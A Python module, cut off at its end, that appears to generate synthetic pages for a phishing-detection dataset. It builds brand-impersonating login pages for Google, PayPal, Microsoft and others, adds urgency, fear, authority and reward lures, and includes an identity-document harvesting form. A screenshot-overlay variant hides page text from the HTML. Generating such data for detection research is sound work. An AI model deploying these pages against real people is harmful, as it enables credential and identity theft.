"""
Programmatic HTML page generator for brand login, landing, about, docs, and blog pages.

Builds realistic HTML from brand metadata — no saved HTML template files needed.
Used as the primary generation path; template_loader.py serves as fallback for
brands that have saved real-world HTML templates.
"""

import base64
import io
import os
import random
import textwrap

try:
    from PIL import Image, ImageDraw, ImageFont
except ImportError as exc:  # pragma: no cover - explicit dependency failure
    raise ImportError(
        "Pillow is required for raster screenshot-overlay generation. "
        "Install it with: pip install Pillow"
    ) from exc


# ── Brand Registry ─────────────────────────────────────────────────────────────

BRANDS = {
    "google": {
        "name": "Google",
        "color": "#4285F4",
        "color_light": "#E8F0FE",
        "real_domains": ["accounts.google.com", "google.com"],
        "tagline": "Sign in to your Google Account",
        "footer": "Google LLC, 1600 Amphitheatre Parkway, Mountain View, CA 94043",
        "fields": [
            {"name": "identifier", "type": "text", "placeholder": "Email or phone", "id": "identifierId"},
            {"name": "Passwd", "type": "password", "placeholder": "Enter your password", "id": "password"},
        ],
    },
    "microsoft": {
        "name": "Microsoft",
        "color": "#00A4EF",
        "color_light": "#E5F6FD",
        "real_domains": ["login.microsoftonline.com", "microsoft.com"],
        "tagline": "Sign in to your Microsoft account",
        "footer": "Microsoft Corporation, Redmond, WA 98052",
        "fields": [
            {"name": "loginfmt", "type": "text", "placeholder": "Email, phone, or Skype", "id": "i0116"},
            {"name": "passwd", "type": "password", "placeholder": "Password", "id": "i0118"},
        ],
    },
    "paypal": {
        "name": "PayPal",
        "color": "#003087",
        "color_light": "#E6F0FF",
        "real_domains": ["paypal.com"],
        "tagline": "Log in to your PayPal account",
        "footer": "PayPal, Inc. 2211 N. First St. San Jose, CA 95131",
        "fields": [
            {"name": "email", "type": "email", "placeholder": "Email or mobile number", "id": "email"},
            {"name": "password", "type": "password", "placeholder": "Password", "id": "password"},
        ],
    },
    "apple": {
        "name": "Apple",
        "color": "#555555",
        "color_light": "#F5F5F7",
        "real_domains": ["apple.com", "icloud.com"],
        "tagline": "Sign in with your Apple ID",
        "footer": "Apple Inc. One Apple Park Way, Cupertino, CA 95014",
        "fields": [
            {"name": "account_name_text", "type": "text", "placeholder": "Email or Phone Number", "id": "account_name_text_field"},
            {"name": "password_text", "type": "password", "placeholder": "Password", "id": "password_text_field"},
        ],
    },
    "facebook": {
        "name": "Facebook",
        "color": "#1877F2",
        "color_light": "#E7F3FF",
        "real_domains": ["facebook.com"],
        "tagline": "Log in to Facebook",
        "footer": "Meta Platforms, Inc., 1 Hacker Way, Menlo Park, CA 94025",
        "fields": [
            {"name": "email", "type": "text", "placeholder": "Email address or phone number", "id": "email"},
            {"name": "pass", "type": "password", "placeholder": "Password", "id": "pass"},
        ],
    },
    "amazon": {
        "name": "Amazon",
        "color": "#FF9900",
        "color_light": "#FFF8E1",
        "real_domains": ["amazon.com"],
        "tagline": "Sign in to your Amazon account",
        "footer": "Amazon.com, Inc., 410 Terry Ave. North, Seattle, WA 98109",
        "fields": [
            {"name": "email", "type": "email", "placeholder": "Email or phone number", "id": "ap_email"},
            {"name": "password", "type": "password", "placeholder": "Password", "id": "ap_password"},
        ],
    },
    "instagram": {
        "name": "Instagram",
        "color": "#E4405F",
        "color_light": "#FDE8EC",
        "real_domains": ["instagram.com"],
        "tagline": "Log in to Instagram",
        "footer": "Meta Platforms, Inc., 1 Hacker Way, Menlo Park, CA 94025",
        "fields": [
            {"name": "username", "type": "text", "placeholder": "Phone number, username, or email", "id": "username"},
            {"name": "password", "type": "password", "placeholder": "Password", "id": "password"},
        ],
    },
    "linkedin": {
        "name": "LinkedIn",
        "color": "#0A66C2",
        "color_light": "#E8F4FD",
        "real_domains": ["linkedin.com"],
        "tagline": "Sign in to LinkedIn",
        "footer": "LinkedIn Corporation, 1000 W. Maude Ave., Sunnyvale, CA 94085",
        "fields": [
            {"name": "session_key", "type": "text", "placeholder": "Email or phone", "id": "session_key"},
            {"name": "session_password", "type": "password", "placeholder": "Password", "id": "session_password"},
        ],
    },
    "netflix": {
        "name": "Netflix",
        "color": "#E50914",
        "color_light": "#FDE8E9",
        "real_domains": ["netflix.com"],
        "tagline": "Sign In",
        "footer": "Netflix, Inc. 100 Winchester Circle, Los Gatos, CA 95032",
        "fields": [
            {"name": "email", "type": "email", "placeholder": "Email or phone number", "id": "id_email"},
            {"name": "password", "type": "password", "placeholder": "Password", "id": "id_password"},
        ],
    },
    "twitter": {
        "name": "Twitter / X",
        "color": "#1DA1F2",
        "color_light": "#E8F7FE",
        "real_domains": ["twitter.com", "x.com"],
        "tagline": "Sign in to X",
        "footer": "X Corp., 1355 Market Street, San Francisco, CA 94103",
        "fields": [
            {"name": "text", "type": "text", "placeholder": "Phone, email, or username", "id": "identifier"},
            {"name": "password", "type": "password", "placeholder": "Password", "id": "password"},
        ],
    },
    "github": {
        "name": "GitHub",
        "color": "#24292E",
        "color_light": "#F6F8FA",
        "real_domains": ["github.com"],
        "tagline": "Sign in to GitHub",
        "footer": "GitHub, Inc., 88 Colin P. Kelly Jr. St. San Francisco, CA 94107",
        "fields": [
            {"name": "login", "type": "text", "placeholder": "Username or email address", "id": "login_field"},
            {"name": "password", "type": "password", "placeholder": "Password", "id": "password_field"},
        ],
    },
    "dropbox": {
        "name": "Dropbox",
        "color": "#0061FF",
        "color_light": "#E6F0FF",
        "real_domains": ["dropbox.com"],
        "tagline": "Sign in to Dropbox",
        "footer": "Dropbox, Inc. 1800 Owens St. San Francisco, CA 94158",
        "fields": [
            {"name": "login_email", "type": "email", "placeholder": "Email", "id": "login_email"},
            {"name": "login_password", "type": "password", "placeholder": "Password", "id": "login_password"},
        ],
    },
}


def get_brand(brand_key: str) -> dict:
    """Get brand metadata by key. Raises KeyError if not found."""
    if brand_key not in BRANDS:
        raise KeyError(f"Unknown brand: '{brand_key}'. Available: {list(BRANDS.keys())}")
    return BRANDS[brand_key]


def get_all_brand_keys() -> list[str]:
    """Return all available brand keys."""
    return list(BRANDS.keys())


# ── HTML Building Blocks ───────────────────────────────────────────────────────

def _css_base(brand: dict) -> str:
    """Return base CSS for a brand-styled page."""
    return textwrap.dedent(f"""\
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, sans-serif;
            background: #f5f5f5;
            color: #333;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
        }}
        .container {{
            width: 100%;
            max-width: 420px;
            margin: 0 auto;
            padding: 40px 20px;
            flex: 1;
            display: flex;
            flex-direction: column;
            justify-content: center;
        }}
        .card {{
            background: #fff;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            padding: 40px 32px;
        }}
        .logo {{
            text-align: center;
            margin-bottom: 24px;
        }}
        .logo h1 {{
            color: {brand['color']};
            font-size: 28px;
            font-weight: 600;
        }}
        .tagline {{
            text-align: center;
            color: #666;
            margin-bottom: 24px;
            font-size: 14px;
        }}
        .form-group {{
            margin-bottom: 16px;
        }}
        .form-group label {{
            display: block;
            font-size: 13px;
            font-weight: 500;
            color: #555;
            margin-bottom: 4px;
        }}
        .form-group input {{
            width: 100%;
            padding: 12px 14px;
            border: 1px solid #ddd;
            border-radius: 6px;
            font-size: 15px;
            outline: none;
            transition: border-color 0.2s;
        }}
        .form-group input:focus {{
            border-color: {brand['color']};
        }}
        .btn-primary {{
            width: 100%;
            padding: 12px;
            background: {brand['color']};
            color: #fff;
            border: none;
            border-radius: 6px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 8px;
        }}
        .btn-primary:hover {{
            opacity: 0.9;
        }}
        .links {{
            text-align: center;
            margin-top: 16px;
            font-size: 13px;
        }}
        .links a {{
            color: {brand['color']};
            text-decoration: none;
        }}
        .links a:hover {{
            text-decoration: underline;
        }}
        footer {{
            text-align: center;
            padding: 20px;
            font-size: 11px;
            color: #999;
        }}
    """)


def _form_fields_html(fields: list[dict], hidden_fields_html: str = "") -> str:
    """Build <input> elements from a field list + hidden fields."""
    parts = []
    for f in fields:
        label = f.get("placeholder", f["name"])
        parts.append(textwrap.dedent(f"""\
            <div class="form-group">
                <label for="{f['id']}">{label}</label>
                <input type="{f['type']}" name="{f['name']}" id="{f['id']}"
                       placeholder="{f['placeholder']}" autocomplete="off">
            </div>"""))
    if hidden_fields_html:
        parts.append(hidden_fields_html)
    return "\n".join(parts)


# ── Page Builders ──────────────────────────────────────────────────────────────

def build_login_page(brand: dict, form_action: str, hidden_fields_html: str = "",
                     platform_url: str = "") -> str:
    """
    Build a complete HTML login page for a brand.

    Args:
        brand: Brand metadata dict (from BRANDS).
        form_action: URL the form submits to.
        hidden_fields_html: Raw HTML string of hidden <input> elements.
        platform_url: Hosting platform URL (shown in footer or debug info).

    Returns:
        Complete HTML5 document string.
    """
    fields_html = _form_fields_html(brand["fields"], hidden_fields_html)
    css = _css_base(brand)

    return textwrap.dedent(f"""\
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>{brand['name']} - Sign In</title>
            <style>{css}</style>
        </head>
        <body>
            <div class="container">
                <div class="card">
                    <div class="logo">
                        <h1>{brand['name']}</h1>
                    </div>
                    <p class="tagline">{brand['tagline']}</p>
                    <form action="{form_action}" method="POST">
                        {fields_html}
                        <button type="submit" class="btn-primary">Sign In</button>
                    </form>
                    <div class="links">
                        <a href="#">Forgot password?</a> &middot; <a href="#">Create account</a>
                    </div>
                </div>
            </div>
            <footer>{brand['footer']}</footer>
        </body>
        </html>""")


def build_urgency_page(brand: dict, form_action: str, hidden_fields_html: str = "",
                       platform_url: str = "", urgency_text: str = "") -> str:
    """Build a login page with urgency/warning banner injected."""
    base = build_login_page(brand, form_action, hidden_fields_html, platform_url)

    if not urgency_text:
        urgency_text = random.choice([
            "⚠️ Your account will be suspended in 24 hours. Verify your identity now.",
            "⚠️ Unusual sign-in activity detected. Confirm your account to avoid lockout.",
            "⚠️ Your account has been temporarily limited. Update your information.",
            "⚠️ Security Alert: Unauthorized access attempt detected. Verify now.",
            "⚠️ Action Required: Your session expires in 2 hours. Re-authenticate.",
        ])

    banner = textwrap.dedent(f"""\
        <div style="background:#fff3cd;border:1px solid #ffc107;border-radius:6px;padding:12px 16px;margin-bottom:20px;font-size:14px;color:#856404;text-align:center;">
            {urgency_text}
        </div>""")

    return base.replace('<div class="card">', f'<div class="card">\n{banner}', 1)


def build_authority_page(brand: dict, form_action: str, hidden_fields_html: str = "",
                         platform_url: str = "", authority_text: str = "") -> str:
    """Build a login page with authority-spoofing banner."""
    base = build_login_page(brand, form_action, hidden_fields_html, platform_url)

    if not authority_text:
        authority_text = random.choice([
            "From: IT Security Team — Password expires today. Update immediately.",
            "From: {brand} Support — Your account requires verification. Act now.",
            "From: System Administrator — Mandatory security update required.",
            "From: Help Desk — We detected a login from an unknown device. Verify.",
            "From: Compliance — Complete your annual security review by end of day.",
        ]).replace("{brand}", brand["name"])

    banner = textwrap.dedent(f"""\
        <div style="background:#d1ecf1;border:1px solid #bee5eb;border-radius:6px;padding:12px 16px;margin-bottom:20px;font-size:14px;color:#0c5460;text-align:center;">
            {authority_text}
        </div>""")

    return base.replace('<div class="card">', f'<div class="card">\n{banner}', 1)


def build_fear_page(brand: dict, form_action: str, hidden_fields_html: str = "",
                    platform_url: str = "", fear_text: str = "") -> str:
    """Build a login page with fear-inducing language."""
    base = build_login_page(brand, form_action, hidden_fields_html, platform_url)

    if not fear_text:
        fear_text = random.choice([
            "🚨 Your account has been compromised. Immediate action required to prevent data loss.",
            "🚨 Suspicious activity: Your personal data may have been exposed. Secure your account.",
            "🚨 Warning: Your account shows signs of unauthorized access. Change password now.",
            "🚨 Critical: Your account will be permanently deleted in 48 hours if not verified.",
            "🚨 Alert: Multiple failed login attempts detected. Your account is at risk.",
        ])

    banner = textwrap.dedent(f"""\
        <div style="background:#f8d7da;border:1px solid #f5c6cb;border-radius:6px;padding:12px 16px;margin-bottom:20px;font-size:14px;color:#721c24;text-align:center;">
            {fear_text}
        </div>""")

    return base.replace('<div class="card">', f'<div class="card">\n{banner}', 1)


def build_reward_page(brand: dict, form_action: str, hidden_fields_html: str = "",
                      platform_url: str = "", reward_text: str = "") -> str:
    """Build a login page with reward bait."""
    base = build_login_page(brand, form_action, hidden_fields_html, platform_url)

    if not reward_text:
        reward_text = random.choice([
            "🎁 Congratulations! You've been selected for a $500 gift card. Sign in to claim.",
            "🎁 You've won a free premium subscription! Log in to activate your reward.",
            "🎁 Exclusive offer: Upgrade your account to Premium for free. Limited time.",
            "🎁 Your loyalty reward is ready! Sign in to redeem your $200 credit.",
            "🎁 Special promotion: Get 6 months free with your next purchase. Claim now.",
        ])

    banner = textwrap.dedent(f"""\
        <div style="background:#d4edda;border:1px solid #c3e6cb;border-radius:6px;padding:12px 16px;margin-bottom:20px;font-size:14px;color:#155724;text-align:center;">
            {reward_text}
        </div>""")

    return base.replace('<div class="card">', f'<div class="card">\n{banner}', 1)


def build_document_phish_page(brand: dict, form_action: str, hidden_fields_html: str = "",
                              platform_url: str = "") -> str:
    """Build a login page that asks for document upload (identity verification scam)."""
    css = _css_base(brand)
    extra_fields = textwrap.dedent(f"""\
        <div class="form-group">
            <label for="full_name">Full Legal Name</label>
            <input type="text" name="full_name" id="full_name" placeholder="John Doe" autocomplete="off">
        </div>
        <div class="form-group">
            <label for="id_number">ID / SSN Last 4 Digits</label>
            <input type="text" name="id_number" id="id_number" placeholder="XXXX" maxlength="4" autocomplete="off">
        </div>
        <div class="form-group">
            <label for="doc_upload">Upload ID Document</label>
            <input type="file" name="doc_upload" id="doc_upload" accept=".jpg,.png,.pdf">
        </div>""")

    if hidden_fields_html:
        extra_fields += f"\n{hidden_fields_html}"

    fields_html = _form_fields_html(brand["fields"], extra_fields)

    return textwrap.dedent(f"""\
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>{brand['name']} - Identity Verification Required</title>
            <style>{css}</style>
        </head>
        <body>
            <div class="container">
                <div class="card">
                    <div class="logo">
                        <h1>{brand['name']}</h1>
                    </div>
                    <p class="tagline">Identity Verification Required</p>
                    <div style="background:#fff3cd;border:1px solid #ffc107;border-radius:6px;padding:12px 16px;margin-bottom:20px;font-size:13px;color:#856404;text-align:center;">
                        We need to verify your identity to keep your account secure. Please provide the information below.
                    </div>
                    <form action="{form_action}" method="POST" enctype="multipart/form-data">
                        {fields_html}
                        <button type="submit" class="btn-primary">Submit Verification</button>
                    </form>
                </div>
            </div>
            <footer>{brand['footer']}</footer>
        </body>
        </html>""")


# ── Legitimate Page Builders ──────────────────────────────────────────────────

def build_landing_page(brand: dict, platform_url: str = "") -> str:
    """Build a legitimate marketing/landing page (no login form)."""
    # Random Rewards
    reward_sections = [
    """
    <div class="feature">
        <h3>Member Benefits</h3>
        <p>Explore loyalty rewards, exclusive offers, and benefits available to our customers.</p>
    </div>
    """,
    """
    <div class="feature">
        <h3>Customer Program</h3>
        <p>Join our customer program and receive member discounts and promotional updates.</p>
    </div>
    """,
    """
    <div class="feature">
        <h3>Exclusive Offers</h3>
        <p>Access special promotions and seasonal deals reserved for registered members.</p>
    </div>
    """,
    """
    <div class="feature">
        <h3>Loyalty Rewards</h3>
        <p>Earn points on everyday activity and redeem them for discounts, upgrades, and extra features.</p>
    </div>
    """,
    """
    <div class="feature">
        <h3>Premium Perks</h3>
        <p>Enjoy priority support, early access to new tools, and additional storage with your membership.</p>
    </div>
    """,
    """
    <div class="feature">
        <h3>Member Discounts</h3>
        <p>Save on selected services and products with exclusive rates available to account holders.</p>
    </div>
    """,
    """
    <div class="feature">
        <h3>Rewards Program</h3>
        <p>Participate in our rewards program to unlock benefits tailored to how you use the platform.</p>
    </div>
    """,
    """
    <div class="feature">
        <h3>Special Privileges</h3>
        <p>Get early invitations to new features and limited-time member-only experiences.</p>
    </div>
    """,
    """
    <div class="feature">
        <h3>Account Advantages</h3>
        <p>Benefit from streamlined tools, personalized insights, and helpful resources designed for our users.</p>
    </div>
    """,
    """
    <div class="feature">
        <h3>Community Benefits</h3>
        <p>Connect with other members and take advantage of shared resources, tips, and collaborative features.</p>
    </div>
    """,
    "",  # empty option for landing page without a reward
]

    reward_section = random.choice(reward_sections)
    return textwrap.dedent(f"""\
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>{brand['name']}</title>
            <style>
                * {{ margin: 0; padding: 0; box-sizing: border-box; }}
                body {{ font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; color: #333; }}
                .hero {{ background: {brand['color']}; color: #fff; padding: 80px 20px; text-align: center; }}
                .hero h1 {{ font-size: 42px; margin-bottom: 16px; }}
                .hero p {{ font-size: 18px; opacity: 0.9; max-width: 600px; margin: 0 auto; }}
                .features {{ max-width: 800px; margin: 60px auto; padding: 0 20px; display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 32px; text-align: center; }}
                .feature h3 {{ margin-bottom: 8px; color: {brand['color']}; }}
                .cta {{ text-align: center; padding: 40px 20px; }}
                .cta a {{ display: inline-block; padding: 14px 32px; background: {brand['color']}; color: #fff; text-decoration: none; border-radius: 6px; font-weight: 600; }}
                footer {{ text-align: center; padding: 20px; font-size: 11px; color: #999; }}
            </style>
        </head>
        <body>
            <div class="hero">
                <h1>{brand['name']}</h1>
                <p>{brand['tagline']}</p>
            </div>
            <div class="features">
                <div class="feature"><h3>Fast</h3><p>Lightning-speed performance for all your needs.</p></div>
                <div class="feature"><h3>Secure</h3><p>Industry-leading security to protect your data.</p></div>
                <div class="feature"><h3>Trusted</h3><p>Used by millions of people worldwide.</p></div>
                {reward_section}
            </div>
            <div class="cta">
                <a href="#">Get Started Today</a>
            </div>
            <footer>{brand['footer']}</footer>
        </body>
        </html>""")


def build_about_page(brand: dict, platform_url: str = "") -> str:
    """Build a legitimate about/company page."""
    return textwrap.dedent(f"""\
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>About {brand['name']}</title>
            <style>
                * {{ margin: 0; padding: 0; box-sizing: border-box; }}
                body {{ font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; color: #333; line-height: 1.6; }}
                .container {{ max-width: 700px; margin: 0 auto; padding: 60px 20px; }}
                h1 {{ color: {brand['color']}; margin-bottom: 24px; }}
                h2 {{ margin-top: 32px; margin-bottom: 12px; }}
                p {{ margin-bottom: 16px; color: #555; }}
                .team {{ display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-top: 20px; }}
                .member {{ background: {brand['color_light']}; padding: 20px; border-radius: 8px; text-align: center; }}
                .member h4 {{ margin-bottom: 4px; }}
                .member p {{ font-size: 13px; margin: 0; }}
                footer {{ text-align: center; padding: 20px; font-size: 11px; color: #999; }}
            </style>
        </head>
        <body>
            <div class="container">
                <h1>About {brand['name']}</h1>
                <p>{brand['name']} is a leading technology company dedicated to building innovative products that empower people around the world.</p>
                <h2>Our Mission</h2>
                <p>To make the world more open and connected by building tools that help people find community and belonging.</p>
                <h2>Our Team</h2>
                <div class="team">
                    <div class="member"><h4>Sarah Chen</h4><p>CEO &amp; Founder</p></div>
                    <div class="member"><h4>Marcus Johnson</h4><p>CTO</p></div>
                    <div class="member"><h4>Emily Park</h4><p>VP of Engineering</p></div>
                    <div class="member"><h4>David Kim</h4><p>Head of Design</p></div>
                </div>
            </div>
            <footer>{brand['footer']}</footer>
        </body>
        </html>""")


def build_docs_page(brand: dict, platform_url: str = "") -> str:
    """Build a legitimate documentation/help page."""
    return textwrap.dedent(f"""\
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>{brand['name']} Help Center</title>
            <style>
                * {{ margin: 0; padding: 0; box-sizing: border-box; }}
                body {{ font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; color: #333; line-height: 1.6; background: #fafafa; }}
                .header {{ background: {brand['color']}; color: #fff; padding: 20px; }}
                .header h1 {{ font-size: 20px; }}
                .content {{ max-width: 700px; margin: 40px auto; padding: 0 20px; }}
                h2 {{ margin-bottom: 12px; color: {brand['color']}; }}
                .faq {{ background: #fff; border: 1px solid #e0e0e0; border-radius: 8px; margin-bottom: 16px; padding: 20px; }}
                .faq h3 {{ margin-bottom: 8px; font-size: 15px; }}
                .faq p {{ font-size: 14px; color: #555; }}
                footer {{ text-align: center; padding: 20px; font-size: 11px; color: #999; }}
            </style>
        </head>
        <body>
            <div class="header"><h1>{brand['name']} Help Center</h1></div>
            <div class="content">
                <h2>Frequently Asked Questions</h2>
                <div class="faq">
                    <h3>How do I reset my password?</h3>
                    <p>Go to the login page and click "Forgot password" to receive a reset link via email.</p>
                </div>
                <div class="faq">
                    <h3>How do I enable two-factor authentication?</h3>
                    <p>Navigate to Settings &gt; Security &gt; Two-Factor Authentication and follow the setup wizard.</p>
                </div>
                <div class="faq">
                    <h3>How do I contact support?</h3>
                    <p>You can reach our support team at support@{brand['real_domains'][0]} or through the in-app help widget.</p>
                </div>
                <div class="faq">
                    <h3>Is my data secure?</h3>
                    <p>Yes. We use industry-standard encryption and security practices to protect your data at rest and in transit.</p>
                </div>
                <div class="faq">
                    <h3>How do I attach files to a support request?</h3>
                    <p>You can upload screenshots, PDF documents, or other files when contacting our support team.</p>
                </div>
            </div>
            <footer>{brand['footer']}</footer>
        </body>
        </html>""")


def build_blog_page(brand: dict, platform_url: str = "") -> str:
    """Build a legitimate blog post page."""
    return textwrap.dedent(f"""\
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>{brand['name']} Blog</title>
            <style>
                * {{ margin: 0; padding: 0; box-sizing: border-box; }}
                body {{ font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; color: #333; line-height: 1.8; background: #fafafa; }}
                .article {{ max-width: 680px; margin: 40px auto; background: #fff; padding: 48px; border-radius: 8px; box-shadow: 0 1px 4px rgba(0,0,0,0.08); }}
                h1 {{ color: {brand['color']}; margin-bottom: 8px; font-size: 28px; }}
                .meta {{ color: #999; font-size: 13px; margin-bottom: 24px; }}
                p {{ margin-bottom: 16px; color: #444; }}
                h2 {{ margin-top: 28px; margin-bottom: 12px; font-size: 20px; }}
                blockquote {{ border-left: 3px solid {brand['color']}; padding-left: 16px; margin: 16px 0; color: #666; font-style: italic; }}
                footer {{ text-align: center; padding: 20px; font-size: 11px; color: #999; }}
            </style>
        </head>
        <body>
            <div class="article">
                <h1>Introducing Our Latest Feature Update</h1>
                <div class="meta">Published on January 15, 2025 &middot; by {brand['name']} Team</div>
                <p>We are excited to announce a major update that brings new capabilities and improved performance to {brand['name']}. This release includes several features that our community has been requesting.</p>
                <h2>What's New</h2>
                <p>Our engineering team has been working on performance optimizations that result in up to 40% faster load times. We've also added new collaboration tools that make it easier to work with your team.</p>
                <blockquote>"We're committed to building the best possible experience for our users." — {brand['name']} Team</blockquote>
                <h2>Security Improvements</h2>
                <p>In addition to new features, this update includes important security enhancements. We've strengthened our encryption protocols and added support for hardware security keys.</p>
                <p>Update your {brand['name']} app today to take advantage of these improvements. As always, we value your feedback and encourage you to share your thoughts with us.</p>
            </div>
            <footer>{brand['footer']}</footer>
        </body>
        </html>""")


def build_profile_page(brand: dict, platform_url: str = "") -> str:
    """Build a legitimate profile page
    """
    return textwrap.dedent(f"""\
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>{brand['name']} Blog</title>
            <style>
                * {{ margin: 0; padding: 0; box-sizing: border-box; }}
                body {{ font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; color: #333; line-height: 1.8; background: #fafafa; }}
                .article {{ max-width: 680px; margin: 40px auto; background: #fff; padding: 48px; border-radius: 8px; box-shadow: 0 1px 4px rgba(0,0,0,0.08); }}
                h1 {{ color: {brand['color']}; margin-bottom: 8px; font-size: 28px; }}
                .meta {{ color: #999; font-size: 13px; margin-bottom: 24px; }}
                p {{ margin-bottom: 16px; color: #444; }}
                h2 {{ margin-top: 28px; margin-bottom: 12px; font-size: 20px; }}
                blockquote {{ border-left: 3px solid {brand['color']}; padding-left: 16px; margin: 16px 0; color: #666; font-style: italic; }}
                footer {{ text-align: center; padding: 20px; font-size: 11px; color: #999; }}
            </style>
        </head>
        <body>
            <h1>{brand['name']} Profile Settings</h1>
            <p>Upload a profile image or update your account preferences.</p>
            <label>Profile image</label>
            <input type="file">
            <p>Supported formats: JPG, PNG, PDF documents.</p>
            <footer>{brand['footer']}</footer>
        </body>
        </html>""")


# ── Raster Screenshot Overlay Page Builder ─────────────────────────────────────

def _load_raster_font(size: int, *, bold: bool = False):
    """Load a common TrueType font with a safe Pillow fallback."""
    candidates = [
        "/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf" if bold
        else "/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf",
        "/usr/share/fonts/truetype/liberation2/LiberationSans-Bold.ttf" if bold
        else "/usr/share/fonts/truetype/liberation2/LiberationSans-Regular.ttf",
        "/Library/Fonts/Arial Bold.ttf" if bold else "/Library/Fonts/Arial.ttf",
        "C:/Windows/Fonts/arialbd.ttf" if bold else "C:/Windows/Fonts/arial.ttf",
    ]
    for font_path in candidates:
        if os.path.exists(font_path):
            return ImageFont.truetype(font_path, size=size)
    return ImageFont.load_default()


def _draw_centered_text(draw, xy, text: str, font, fill: str) -> None:
    """Draw text centered around the given x coordinate."""
    x, y = xy
    box = draw.textbbox((0, 0), text, font=font)
    width = box[2] - box[0]
    draw.text((x - width / 2, y), text, font=font, fill=fill)


def render_login_screenshot_asset(
    brand: dict,
    viewport_width: int | None = None,
    viewport_height: int | None = None,
) -> tuple[bytes, dict]:
    """
    Rasterize a synthetic brand login page into a real PNG image.

    The visible brand, labels, button text, links, and footer exist only as
    pixels in the returned PNG. They are intentionally absent from the HTML DOM.

    Returns:
        (png_bytes, geometry_metadata)

    The geometry metadata is used only to position the transparent HTML form.
    It should be retained as generation provenance, not used as a classifier
    feature, because it directly identifies this synthetic attack strategy.
    """
    width = viewport_width or random.choice([1280, 1365, 1440])
    height = viewport_height or random.choice([720, 768, 800, 900])

    image = Image.new("RGB", (width, height), "#f4f6f8")
    draw = ImageDraw.Draw(image)

    font_logo = _load_raster_font(30, bold=True)
    font_heading = _load_raster_font(22, bold=True)
    font_body = _load_raster_font(15)
    font_label = _load_raster_font(13, bold=True)
    font_button = _load_raster_font(15, bold=True)
    font_small = _load_raster_font(12)

    # Header
    header_h = 68
    draw.rectangle((0, 0, width, header_h), fill=brand["color"])
    draw.text((28, 18), brand["name"], font=font_logo, fill="#ffffff")

    # Login card
    card_w = 430
    card_h = 500
    card_x = (width - card_w) // 2
    card_y = max(header_h + 30, (height - card_h) // 2 + random.randint(-12, 12))
    card_y = min(card_y, height - card_h - 34)

    # Simple shadow and card
    draw.rounded_rectangle(
        (card_x + 4, card_y + 7, card_x + card_w + 4, card_y + card_h + 7),
        radius=12,
        fill="#d9dde2",
    )
    draw.rounded_rectangle(
        (card_x, card_y, card_x + card_w, card_y + card_h),
        radius=12,
        fill="#ffffff",
        outline="#e4e7eb",
        width=1,
    )

    center_x = card_x + card_w // 2
    _draw_centered_text(draw, (center_x, card_y + 34), brand["name"], font_logo, brand["color"])
    _draw_centered_text(draw, (center_x, card_y + 80), brand["tagline"], font_heading, "#202124")

    inner_x = card_x + 42
    field_w = card_w - 84
    field_h = 48

    label_1 = brand["fields"][0].get("placeholder", "Email or username")
    label_2 = brand["fields"][1].get("placeholder", "Password")

    label1_y = card_y + 142
    field1_y = label1_y + 24
    label2_y = field1_y + field_h + 24
    field2_y = label2_y + 24
    button_y = field2_y + field_h + 28
    button_h = 48

    draw.text((inner_x, label1_y), label_1, font=font_label, fill="#3c4043")
    draw.rounded_rectangle(
        (inner_x, field1_y, inner_x + field_w, field1_y + field_h),
        radius=7,
        fill="#ffffff",
        outline="#bdc1c6",
        width=2,
    )

    draw.text((inner_x, label2_y), label_2, font=font_label, fill="#3c4043")
    draw.rounded_rectangle(
        (inner_x, field2_y, inner_x + field_w, field2_y + field_h),
        radius=7,
        fill="#ffffff",
        outline="#bdc1c6",
        width=2,
    )

    draw.rounded_rectangle(
        (inner_x, button_y, inner_x + field_w, button_y + button_h),
        radius=7,
        fill=brand["color"],
    )
    _draw_centered_text(draw, (center_x, button_y + 14), "Sign In", font_button, "#ffffff")

    _draw_centered_text(
        draw,
        (center_x, button_y + button_h + 24),
        "Forgot password?   ·   Create account",
        font_small,
        brand["color"],
    )

    # Footer remains inside the raster image.
    footer = brand.get("footer", "")
    footer_box = draw.textbbox((0, 0), footer, font=font_small)
    footer_w = footer_box[2] - footer_box[0]
    if footer_w > width - 60:
        # Keep OCR text readable without implementing a full layout engine.
        footer = footer[:110] + "…"
    _draw_centered_text(draw, (width // 2, height - 30), footer, font_small, "#6f7378")

    # Ground-truth text intentionally rendered into the PNG.
    # This is NOT OCR output. It is stored so the synthetic dataset knows
    # exactly what a later OCR stage should recover from the raster image.
    raster_text_ground_truth = " ".join([
        brand["name"],          # top header
        brand["name"],          # login-card brand heading
        brand["tagline"],
        label_1,
        label_2,
        "Sign In",
        "Forgot password?",
        "Create account",
        footer,
    ])

    buffer = io.BytesIO()
    image.save(buffer, format="PNG", optimize=True)

    geometry = {
        "viewport_width": width,
        "viewport_height": height,
